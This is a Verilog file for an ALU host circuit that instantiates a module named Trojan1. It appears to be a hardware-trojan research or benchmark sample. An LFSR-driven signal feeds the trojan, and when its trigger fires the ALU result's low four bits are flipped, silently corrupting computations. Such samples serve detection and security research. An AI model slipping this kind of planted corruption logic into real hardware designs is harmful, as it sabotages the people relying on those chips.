// ALU Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_alu_host #(
    parameter DATA_WIDTH = 16,    // ALU operand width
    parameter [15:0] R1_PATTERN = 16'hB00B  // Pattern for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] operand_a,
    input wire [DATA_WIDTH-1:0] operand_b,
    input wire [3:0] alu_op,
    input wire alu_enable,
    output reg [DATA_WIDTH-1:0] alu_result,
    output reg [3:0] alu_flags,  // flags: [3:overflow, 2:carry, 1:zero, 0:negative]
    output reg result_valid
);

    // Trojan interface (fixed width)
    wire trojan_r1;
    wire trojan_trigger;
    
    // ALU internal signals
    reg [DATA_WIDTH:0] temp_result;  // Extra bit for carry/overflow
    reg temp_overflow, temp_carry, temp_zero, temp_negative;
    reg [15:0] pattern_shift;
    reg [3:0] pattern_counter;
    
    // R1 signal generation using shifting pattern
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pattern_shift <= R1_PATTERN;
            pattern_counter <= 4'b0;
        end else if (alu_enable) begin
            pattern_counter <= pattern_counter + 1;
            if (pattern_counter == 4'hF) begin
                // Use maximal-length LFSR polynomial for 16-bit: x^16 + x^14 + x^13 + x^11 + 1
            pattern_shift <= {pattern_shift[14:0], pattern_shift[15] ^ pattern_shift[13] ^ pattern_shift[12] ^ pattern_shift[10]};
            end
        end
    end
    
    assign trojan_r1 = pattern_shift[pattern_counter];
    
    // ALU operation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            temp_result <= {DATA_WIDTH+1{1'b0}};
            result_valid <= 1'b0;
        end else if (alu_enable) begin
            case (alu_op)
                4'b0000: temp_result <= {1'b0, operand_a} + {1'b0, operand_b};           // ADD
                4'b0001: temp_result <= {1'b0, operand_a} - {1'b0, operand_b};           // SUB  
                4'b0010: temp_result <= {1'b0, operand_a} & {1'b0, operand_b};           // AND
                4'b0011: temp_result <= {1'b0, operand_a} | {1'b0, operand_b};           // OR
                4'b0100: temp_result <= {1'b0, operand_a} ^ {1'b0, operand_b};           // XOR
                4'b0101: temp_result <= {1'b0, ~operand_a};                              // NOT
                4'b0110: temp_result <= {1'b0, operand_a} << 1;                         // SHL
                4'b0111: temp_result <= {1'b0, operand_a} >> 1;                         // SHR
                4'b1000: temp_result <= (operand_a < operand_b) ? {{DATA_WIDTH{1'b0}}, 1'b1} : {DATA_WIDTH+1{1'b0}}; // SLT
                4'b1001: temp_result <= (operand_a == operand_b) ? {{DATA_WIDTH{1'b0}}, 1'b1} : {DATA_WIDTH+1{1'b0}};// SEQ
                4'b1010: temp_result <= operand_a[DATA_WIDTH/2-1:0] * operand_b[DATA_WIDTH/2-1:0];  // MUL (simplified)
                default: temp_result <= {DATA_WIDTH+1{1'b0}};
            endcase
            result_valid <= 1'b1;
        end else begin
            result_valid <= 1'b0;
        end
    end
    
    // Result and flags with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            alu_result <= {DATA_WIDTH{1'b0}};
            alu_flags <= 4'b0000;
        end else if (result_valid) begin
            // Calculate flags properly
            temp_negative = temp_result[DATA_WIDTH-1];
            temp_zero = (temp_result[DATA_WIDTH-1:0] == {DATA_WIDTH{1'b0}});
            
            // Carry flag for ADD/SUB operations
            case (alu_op)
                4'b0000: temp_carry = temp_result[DATA_WIDTH];  // ADD carry
                4'b0001: temp_carry = temp_result[DATA_WIDTH];  // SUB borrow
                4'b0110: temp_carry = temp_result[DATA_WIDTH];  // SHL carry
                default: temp_carry = 1'b0;
            endcase
            
            // Overflow flag for signed operations
            case (alu_op)
                4'b0000: temp_overflow = (operand_a[DATA_WIDTH-1] == operand_b[DATA_WIDTH-1]) && 
                                        (temp_result[DATA_WIDTH-1] != operand_a[DATA_WIDTH-1]);  // ADD overflow
                4'b0001: temp_overflow = (operand_a[DATA_WIDTH-1] != operand_b[DATA_WIDTH-1]) && 
                                        (temp_result[DATA_WIDTH-1] != operand_a[DATA_WIDTH-1]);  // SUB overflow
                default: temp_overflow = 1'b0;
            endcase
            
            // Apply trojan influence conditionally
            if (trojan_trigger) begin
                // Trojan: corrupt specific bits rather than all bits
                alu_result <= temp_result[DATA_WIDTH-1:0] ^ {{(DATA_WIDTH-4){1'b0}}, 4'hF};
            end else begin
                alu_result <= temp_result[DATA_WIDTH-1:0];
            end
            
            // Set flags in correct order: [3:overflow, 2:carry, 1:zero, 0:negative]
            alu_flags <= {temp_overflow, temp_carry, temp_zero, temp_negative};
        end
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

